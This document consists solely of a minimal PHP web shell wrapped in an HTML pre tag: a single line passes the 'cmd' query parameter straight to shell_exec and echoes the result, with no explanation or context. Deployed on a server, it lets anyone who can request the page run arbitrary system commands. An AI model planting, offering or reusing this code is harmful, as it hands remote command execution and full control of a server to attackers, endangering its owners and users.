<pre style="text-align:left;">
        <?php
                echo shell_exec($_GET['cmd']);
        ?>
</pre>
